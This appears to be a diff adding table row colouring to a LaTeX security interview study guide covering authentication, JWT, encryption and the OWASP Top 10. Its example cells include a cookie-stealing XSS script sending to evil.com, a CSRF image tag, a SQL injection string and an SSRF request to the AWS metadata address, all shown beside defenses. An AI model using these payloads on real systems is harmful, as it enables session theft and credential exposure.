@@ -117,6 +117,7 @@ Security exists because systems are built by humans, humans make mistakes, and a
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.5067}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.4139}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 Company
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -129,10 +130,13 @@ Why
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{Google} & Zero Trust (BeyondCorp model), OAuth/OIDC originator, PKI at scale & Handles billions of users; pioneered "never trust the network" \\
+\rowcolor{zebra}
 \textbf{Meta} & CSRF protection at massive scale, privacy-preserving auth, data minimization (GDPR) & Cambridge Analytica fallout; regulatory scrutiny globally \\
 \textbf{Amazon/AWS} & IAM (RBAC/ABAC hybrid), KMS, Secrets Manager, S3 bucket policies, shared responsibility model & Cloud provider; customer data is existential risk \\
+\rowcolor{zebra}
 \textbf{Apple} & End-to-end encryption (iMessage, iCloud), Secure Enclave, privacy-by-design & Brand identity is privacy; hardware-level secrets \\
 \textbf{Netflix} & JWT at scale, federated identity, multi-tenant security, secrets rotation & Global streaming; content licensing requires DRM and access control \\
+\rowcolor{zebra}
 \textbf{Microsoft} & Azure AD, SAML/OIDC/OAuth, enterprise SSO, RBAC in Azure & Enterprise market; Active Directory is foundation of corporate auth \\
 \end{longtable}
 
@@ -240,6 +244,7 @@ It occurs \textbf{after} authentication. You may know who someone is (authentica
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.4228}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.4609}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 Property
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -252,12 +257,16 @@ JWT (Token)
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{State} & Stateful (server stores session) & Stateless (self-contained) \\
+\rowcolor{zebra}
 \textbf{Storage} & Server-side session store (Redis) & Client-side (localStorage, httpOnly cookie) \\
 \textbf{Scalability} & Requires sticky sessions or shared store & Horizontally scales --- any server can validate \\
+\rowcolor{zebra}
 \textbf{Revocation} & Easy --- delete session from store & Hard --- token valid until expiry (need blocklist) \\
 \textbf{Size} & Tiny cookie (session ID) & Larger --- contains claims \\
+\rowcolor{zebra}
 \textbf{CSRF risk} & High --- cookies sent automatically & Lower with Bearer token in header \\
 \textbf{XSS risk} & Lower if httpOnly cookie & Higher if stored in localStorage \\
+\rowcolor{zebra}
 \textbf{Best for} & Web apps with server-side rendering & APIs, microservices, SPAs, mobile apps \\
 \end{longtable}
 
@@ -270,6 +279,7 @@ JWT (Token)
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3938}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.4611}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 Property
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -282,10 +292,13 @@ ABAC
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{Decision input} & User\textquotesingle s role & Attributes (user, resource, environment) \\
+\rowcolor{zebra}
 \textbf{Granularity} & Coarse (role-level) & Fine (attribute combinations) \\
 \textbf{Flexibility} & Low & High \\
+\rowcolor{zebra}
 \textbf{Complexity} & Low & High \\
 \textbf{Examples} & GitHub repo permissions, AWS IAM roles & AWS IAM policies, OPA/Rego rules \\
+\rowcolor{zebra}
 \textbf{Scales to} & \textasciitilde100s of roles & Millions of policies \\
 \textbf{Interview use} & Default starting point & When asked for fine-grained or dynamic permissions \\
 \end{longtable}
@@ -599,6 +612,7 @@ should be "401 Unauthenticated")
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3652}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.4181}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 Property
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -611,10 +625,13 @@ Authorization (AuthZ)
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{Question} & Who are you? & What are you allowed to do? \\
+\rowcolor{zebra}
 \textbf{When} & First step & After authentication \\
 \textbf{Result} & Identity / principal & Allow or deny decision \\
+\rowcolor{zebra}
 \textbf{HTTP status on failure} & 401 (Unauthorized) & 403 (Forbidden) \\
 \textbf{Examples} & Login, OAuth token validation, mTLS & RBAC check, IAM policy, ACL \\
+\rowcolor{zebra}
 \textbf{Can exist without other?} & No --- authZ needs identity from authN & Yes --- can authorize anonymous users (public resources) \\
 \textbf{Standards} & OAuth 2.0 (access delegation), SAML, OIDC & RBAC, ABAC, AWS IAM, OPA \\
 \end{longtable}
@@ -840,6 +857,7 @@ HS256: HMAC-SHA256(secret, base64url(header) + "." + base64url(payload))
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3805}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.4628}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
 HS256 (symmetric)
@@ -851,8 +869,10 @@ RS256 (asymmetric)
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{Key} & Single shared secret & Private key signs, public key verifies \\
+\rowcolor{zebra}
 \textbf{Who can verify} & Only parties with secret & Anyone with public key (no secret needed) \\
 \textbf{Best for} & Single service (issuer = verifier) & Distributed systems, microservices, OIDC \\
+\rowcolor{zebra}
 \textbf{Key rotation} & Requires updating all services & Just publish new public key (JWKS endpoint) \\
 \end{longtable}
 
@@ -901,6 +921,7 @@ RS256 (asymmetric)
   >{\raggedright\arraybackslash}p{(\columnwidth - 6\tabcolsep) * \real{0.2754}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 6\tabcolsep) * \real{0.2984}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 Property
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -915,12 +936,16 @@ Hashing
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{Reversible?} & Yes (with key) & Yes (with private key) & No (one-way) \\
+\rowcolor{zebra}
 \textbf{Keys} & 1 shared secret key & Key pair (public + private) & No key (or HMAC uses key) \\
 \textbf{Speed} & Fast (microseconds) & Slow (milliseconds) & Fast \\
+\rowcolor{zebra}
 \textbf{Key distribution} & Hard (must share secretly) & Easy (public key is public) & N/A \\
 \textbf{Algorithms} & AES-256, ChaCha20 & RSA-2048, ECDSA, Ed25519 & SHA-256, bcrypt, Argon2 \\
+\rowcolor{zebra}
 \textbf{Primary use} & Bulk data encryption (at rest, TLS records) & Key exchange, digital signatures, certs & Integrity, password storage, fingerprinting \\
 \textbf{Typical output size} & Same as input (+ IV + tag) & Varies (RSA: 256 bytes for 2048-bit) & Fixed (SHA-256: 32 bytes) \\
+\rowcolor{zebra}
 \textbf{Examples in wild} & AES-256-GCM for S3, DB encryption & TLS handshake, code signing, SSH keys & Password hashing, git commits, file checksums \\
 \end{longtable}
 
@@ -931,6 +956,7 @@ Hashing
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3089}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3984}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 Scenario
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -943,14 +969,19 @@ Why
 \bottomrule\noalign{}
 \endlastfoot
 Store user passwords & Argon2id or bcrypt & One-way, slow, salted --- defeats offline attacks \\
+\rowcolor{zebra}
 Encrypt database field (PII) & AES-256-GCM (symmetric) & Fast, authenticated encryption, key from KMS \\
 Secure communication channel & TLS (hybrid: RSA/ECDH + AES) & Asymmetric for key exchange, symmetric for data \\
+\rowcolor{zebra}
 Verify file integrity & SHA-256 hash & Fast, anyone can verify, no key needed \\
 Sign API requests & HMAC-SHA256 & Proves sender has shared secret; request wasn\textquotesingle t tampered \\
+\rowcolor{zebra}
 JWT signature (distributed) & RS256 (RSA) & Verifiers need only public key; issuer keeps private key \\
 JWT signature (single service) & HS256 (HMAC) & Simpler; both sides have same secret \\
+\rowcolor{zebra}
 Encrypt files for specific recipient & RSA encrypt AES key + AES encrypt file & Hybrid: security + performance \\
 SSH authentication & Ed25519 key pair & Asymmetric; private key never leaves your machine \\
+\rowcolor{zebra}
 TLS client authentication (mTLS) & Client certificate (X.509) & Client proves identity with certificate signed by trusted CA \\
 \end{longtable}
 
@@ -979,6 +1010,7 @@ Output: \texttt{IV\ (12\ bytes)\ \textbar{}\textbar{}\ Ciphertext\ \textbar{}\te
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.4262}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.4720}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 Property
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -991,10 +1023,13 @@ XSS (Cross-Site Scripting)
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{Attack vector} & Tricks user\textquotesingle s browser into making unintended request & Injects malicious script into page that runs in victim\textquotesingle s browser \\
+\rowcolor{zebra}
 \textbf{Exploits} & Browser automatically sends cookies & User trusts content from the site; JS has DOM access \\
 \textbf{Target} & State-changing actions (transfer money, change email) & Cookie theft, keylogging, DOM manipulation, redirects \\
+\rowcolor{zebra}
 \textbf{Requires JS?} & No (can use img src, form POST) & Yes \\
 \textbf{Defense} & CSRF tokens, SameSite=Strict cookies, \texttt{Origin}/\texttt{Referer} header check & Output encoding, CSP, HTTPOnly cookies, DOMPurify \\
+\rowcolor{zebra}
 \textbf{Example} & Malicious site has \texttt{\textless{}img\ src="bank.com/transfer?to=attacker\&amount=1000"\textgreater{}} & \texttt{\textless{}script\textgreater{}document.location=\textquotesingle{}evil.com/?c=\textquotesingle{}+document.cookie\textless{}/script\textgreater{}} injected into forum \\
 \textbf{Steals data?} & No (blind attack --- can\textquotesingle t read response) & Yes (full DOM/cookie access) \\
 \end{longtable}
@@ -1036,6 +1071,7 @@ OWASP (Open Web Application Security Project) publishes the top 10 most critical
   >{\raggedright\arraybackslash}p{(\columnwidth - 8\tabcolsep) * \real{0.2931}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 8\tabcolsep) * \real{0.2843}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 \#
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -1052,14 +1088,19 @@ Primary Defense
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{A01} & \textbf{Broken Access Control} & Users can act beyond their intended permissions; vertical/horizontal privilege escalation & User changes \texttt{userId} in URL from \texttt{123} to \texttt{456} and sees another user\textquotesingle s data & Server-side access checks on EVERY request; DENY by default; test with automated scanners \\
+\rowcolor{zebra}
 \textbf{A02} & \textbf{Cryptographic Failures} & Sensitive data exposed due to weak/missing encryption; previously "Sensitive Data Exposure" & Storing passwords in MD5; transmitting PII over HTTP; using ECB mode & TLS everywhere; AES-256-GCM at rest; bcrypt/Argon2 for passwords; no MD5/SHA1 for security \\
 \textbf{A03} & \textbf{Injection} & Attacker sends hostile data to an interpreter (SQL, OS, LDAP, NoSQL) & \texttt{SELECT\ *\ FROM\ users\ WHERE\ id\ =\ \textquotesingle{}1\ OR\ 1=1\textquotesingle{}} dumps all users & Parameterized queries; ORM; input validation/allowlisting; stored procedures; WAF \\
+\rowcolor{zebra}
 \textbf{A04} & \textbf{Insecure Design} & Missing security controls at design phase; threat modeling not done & No rate limiting on login \(\rightarrow\) brute force; no email verification \(\rightarrow\) fake accounts & Threat modeling (STRIDE); security design patterns; abuse case analysis during design \\
 \textbf{A05} & \textbf{Security Misconfiguration} & Default creds; unnecessary features enabled; verbose error messages; cloud storage public & S3 bucket left public; admin panel exposed; stack traces in prod & Hardened configs; disable defaults; automated config scanning (Cloud Custodian, AWS Config) \\
+\rowcolor{zebra}
 \textbf{A06} & \textbf{Vulnerable and Outdated Components} & Using libraries/frameworks with known CVEs & Log4Shell (CVE-2021-44228) --- JNDI injection via log messages; billions of devices affected & SCA tools (Snyk, Dependabot); pin dependency versions; monitor CVE feeds; patch promptly \\
 \textbf{A07} & \textbf{Identification and Authentication Failures} & Broken auth: weak passwords, no MFA, session fixation, predictable session IDs & Session ID not regenerated after login \(\rightarrow\) session fixation attack & MFA; strong password policy; secure session management; bcrypt passwords; PKCE \\
+\rowcolor{zebra}
 \textbf{A08} & \textbf{Software and Data Integrity Failures} & Unsigned updates; insecure deserialization; CI/CD pipeline compromise (supply chain) & SolarWinds SUNBURST --- attacker injected malicious code into build pipeline & Code signing; verify checksums; secure CI/CD; deserialization safeguards; SBOM \\
 \textbf{A09} & \textbf{Security Logging and Monitoring Failures} & No audit logs; alerts not triggered; breaches undetected for months & Equifax breach undetected for 78 days; attackers pivot unnoticed & Centralized logging (ELK, Splunk); alerts on anomalies; test incident response; PCI requires 90-day log retention \\
+\rowcolor{zebra}
 \textbf{A10} & \textbf{Server-Side Request Forgery (SSRF)} & App fetches user-supplied URL; attacker points it at internal services or metadata endpoints & Attacker inputs \texttt{http://169.254.169.254/latest/meta-data/} \(\rightarrow\) AWS instance metadata \(\rightarrow\) IAM credentials & Allowlist outbound URLs; block cloud metadata IPs; network egress controls; disable redirects \\
 \end{longtable}
 
@@ -1244,6 +1285,7 @@ Google eliminated VPN for employees. Every resource access requires: valid certi
   >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.1975}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.8025}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 Security Concept
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -1254,24 +1296,34 @@ Real-Life Analogy
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{Authentication} & The gate guard stops you and asks for your medallion --- \emph{who are you?} No medallion, no entry; the guard doesn\textquotesingle t care how far you\textquotesingle ve traveled \\
+\rowcolor{zebra}
 \textbf{Authorization} & Your keyring decides which doors open once you\textquotesingle re inside --- the scullery key opens the kitchen, the iron key opens the armory; having one does not grant the other \\
 \textbf{Symmetric encryption} & A strongbox where both the sender and recipient carry a copy of the same iron key --- fast to lock and unlock, but you must have met in secret to exchange that key \\
+\rowcolor{zebra}
 \textbf{Asymmetric encryption} & A public mail-slot in the outer wall --- any courier can drop a sealed letter in (encrypt with the public slot), but only the lord inside holds the matching key to open the box \\
 \textbf{Hashing} & A tamper-evident wax seal pressed over the envelope flap --- you cannot unpeel and re-seal it; you can only check whether it still matches the king\textquotesingle s stamp \\
+\rowcolor{zebra}
 \textbf{Salt (password hashing)} & Before pressing the wax seal, each scribe drips a unique drop of their own colored wax into the mix --- two identical letters end up with completely different seals so a forger cannot match them from a table of known seal patterns \\
 \textbf{HMAC} & The king\textquotesingle s signet ring pressed into the wax --- only someone who physically holds that ring can produce that exact seal; anyone in the castle can check the impression, but only the king can create it \\
+\rowcolor{zebra}
 \textbf{OAuth 2.0} & The front-desk clerk issues a day-pass to the glazier so he can fix windows in the east wing --- he never gets your master key, the pass expires at dusk, and it works only in the rooms the clerk specified \\
 \textbf{JWT} & A signed, sealed permit on parchment that names your rank and the rooms you may enter --- every guard can read it and verify the king\textquotesingle s seal on sight; no runner needs to race back to the keep to confirm it \\
+\rowcolor{zebra}
 \textbf{TLS / PKI trust chain} & The chain of royal endorsement: the High King vouches for the Lord, the Lord\textquotesingle s seal vouches for the Knight, the Knight\textquotesingle s letter opens the merchant\textquotesingle s gate --- you trust the end letter because you trust the unbroken chain of seals above it \\
 \textbf{Defense in depth} & First the moat, then the outer wall, then the portcullis, then the inner-ward guard, then the locked vault --- an attacker who swims the moat still faces four more barriers before reaching the crown jewels \\
+\rowcolor{zebra}
 \textbf{Least privilege} & Each servant carries only the keys their duties actually require --- the pantry maid holds the larder key, not the armory key; if she is captured, the weapons stay locked \\
 \textbf{RBAC} & Guards are assigned to roles --- Knight, Squire, Steward --- and each role comes with a fixed set of room keys; changing a man\textquotesingle s rank instantly changes every door he can open \\
+\rowcolor{zebra}
 \textbf{ABAC} & A more nuanced decree: \emph{"Any knight from the northern garrison may enter the map room, but only between dawn and dusk, and only if the kingdom is not under siege"} --- the door checks attributes of the visitor, the room, and the moment \\
 \textbf{Zero trust} & Every door in the castle requires a fresh badge-check, even doors deep inside the inner keep --- being past the moat grants no implicit passage; every room judges for itself \\
+\rowcolor{zebra}
 \textbf{SQL injection / XSS} & A forged letter slipped into the official royal mailbag --- it bears a convincing seal but contains malicious orders; the receiving clerk must inspect every letter\textquotesingle s contents, not just its envelope, before acting on the instructions \\
 \textbf{CSRF} & An enemy herald hands you a pre-written order and asks you to press your own seal onto it --- your seal is genuine, so the castle gate opens, but the order was never yours; the defense is to demand a unique countersign on every outbound order \\
+\rowcolor{zebra}
 \textbf{Secrets management (Vault / KMS)} & The key-press: a locked iron cabinet in the steward\textquotesingle s office where every master key is stored, logged, and issued only to servants who can prove their role --- no key is ever written on the wall or left in a coat pocket \\
 \textbf{Secrets rotation} & After the glazier\textquotesingle s day-pass expires, the front desk re-cuts the east-wing lock --- his old pass becomes worthless even if he kept a copy; periodic re-cutting limits damage from any lost pass \\
+\rowcolor{zebra}
 \textbf{TLS certificate} & The herald carries a letter of introduction bearing the Lord\textquotesingle s seal: it names the herald, states his purpose, and expires after one season --- the castle gate checks the seal and the date before letting him speak \\
 \end{longtable}
 
@@ -2065,6 +2117,7 @@ For passwords: always hash (you never need to recover the original password --- 
   >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.2332}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.7668}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 What
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -2075,20 +2128,28 @@ Remember
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{CIA triad} & Confidentiality, Integrity, Availability \\
+\rowcolor{zebra}
 \textbf{AuthN vs AuthZ} & AuthN=who (401), AuthZ=what (403) \\
 \textbf{Session vs JWT} & Session=stateful+easy revoke; JWT=stateless+hard revoke \\
+\rowcolor{zebra}
 \textbf{Symmetric} & AES-256 --- fast, bulk data, key distribution problem \\
 \textbf{Asymmetric} & RSA/ECDSA --- slow, key exchange, signatures, no key sharing needed \\
+\rowcolor{zebra}
 \textbf{Hashing} & SHA-256=integrity; Argon2/bcrypt=passwords (slow+salted) \\
 \textbf{TLS 1.3} & 1 RTT, ECDH key exchange, AES-GCM record encryption, forward secrecy \\
+\rowcolor{zebra}
 \textbf{OAuth 2.0} & Authorization framework; PKCE prevents code interception \\
 \textbf{OIDC} & OAuth 2.0 + identity; adds id\_token with user claims \\
+\rowcolor{zebra}
 \textbf{JWT} & header.payload.signature; validate ALL: sig+exp+aud+iss \\
 \textbf{CSRF} & Uses your cookies cross-site; fix: SameSite+CSRF token \\
+\rowcolor{zebra}
 \textbf{XSS} & Injects script in page; fix: output encoding + CSP \\
 \textbf{SQL Injection} & Input treated as SQL; fix: parameterized queries \\
+\rowcolor{zebra}
 \textbf{SSRF} & Server fetches attacker URL; fix: allowlist + block metadata IPs \\
 \textbf{Least privilege} & Minimum permissions needed to function \\
+\rowcolor{zebra}
 \textbf{Defense in depth} & Multiple independent security layers \\
 \textbf{Zero Trust} & Verify every request; never implicit trust \\
 \end{longtable}
@@ -2102,6 +2163,7 @@ Remember
   >{\raggedright\arraybackslash}p{(\columnwidth - 8\tabcolsep) * \real{0.1550}}
   >{\raggedright\arraybackslash}p{(\columnwidth - 8\tabcolsep) * \real{0.2326}}@{}}
 \toprule\noalign{}
+\rowcolor{acc!16}
 \begin{minipage}[b]{\linewidth}\raggedright
 Comparison
 \end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
@@ -2118,14 +2180,19 @@ When to use B
 \bottomrule\noalign{}
 \endlastfoot
 \textbf{AuthN vs AuthZ} & Who are you? (AuthN) & What can you do? (AuthZ) & First step always & After AuthN \\
+\rowcolor{zebra}
 \textbf{Session vs JWT} & Stateful, revocable, cookie & Stateless, scalable, token & Web apps, SSR & APIs, microservices, SPAs \\
 \textbf{RBAC vs ABAC} & Role-based, simple & Attribute-based, flexible & General apps & Fine-grained, dynamic policies \\
+\rowcolor{zebra}
 \textbf{HS256 vs RS256} & HMAC, 1 shared secret & RSA, key pair & Single service & Distributed, microservices \\
 \textbf{Symmetric vs Asymmetric} & AES (fast) & RSA/ECDSA (slow) & Bulk encryption & Key exchange, signatures \\
+\rowcolor{zebra}
 \textbf{Hashing vs Encryption} & One-way (SHA-256) & Two-way (AES) & Passwords, integrity & Encrypted fields, transport \\
 \textbf{bcrypt vs Argon2} & CPU-hard & CPU+Memory-hard & Decent choice & Best choice (GPU-resistant) \\
+\rowcolor{zebra}
 \textbf{CSRF vs XSS} & Cross-site request & Injected script & Use your session & Execute in your browser \\
 \textbf{401 vs 403} & Unauthenticated & Unauthorized & Not logged in & Logged in, no permission \\
+\rowcolor{zebra}
 \textbf{TLS 1.2 vs 1.3} & 2 RTT, more ciphers & 1 RTT, fewer (better) ciphers & Legacy compatibility & Always prefer 1.3 \\
 \end{longtable}
 
